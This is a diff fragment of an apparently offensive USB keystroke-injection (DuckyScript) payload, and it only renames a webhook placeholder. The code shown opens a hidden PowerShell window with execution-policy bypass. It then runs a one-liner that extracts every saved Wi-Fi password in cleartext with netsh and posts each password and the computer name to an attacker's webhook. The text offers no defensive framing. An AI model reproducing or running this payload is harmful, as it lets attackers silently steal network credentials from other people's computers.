@@ -17,6 +17,6 @@ STRING powershell -NoP -NonI -W Hidden -Exec Bypass
 ENTER
 DELAY 4000
 
-STRING $w="WEBHOOK_HERE";$a=(netsh wlan show profiles) -replace ".*:\s+";foreach ($b in $a) {$s=$b.Trim();$p=(netsh wlan show profiles name=$s key=clear);$l=$p | Select-String "Key Content";if($l){$k=$l -replace "Key Content\s*:\s+","";$o="$s : $k";$j = @{"username" = "$env:COMPUTERNAME" ;"content" = $o} | ConvertTo-Json;irm -Uri $w -Method Post -ContentType "application/json" -Body $j}}
+STRING $w="YOUR_WEBHOOK_HERE";$a=(netsh wlan show profiles) -replace ".*:\s+";foreach ($b in $a) {$s=$b.Trim();$p=(netsh wlan show profiles name=$s key=clear);$l=$p | Select-String "Key Content";if($l){$k=$l -replace "Key Content\s*:\s+","";$o="$s : $k";$j = @{"username" = "$env:COMPUTERNAME" ;"content" = $o} | ConvertTo-Json;irm -Uri $w -Method Post -ContentType "application/json" -Body $j}}
 DELAY 500
 ENTER
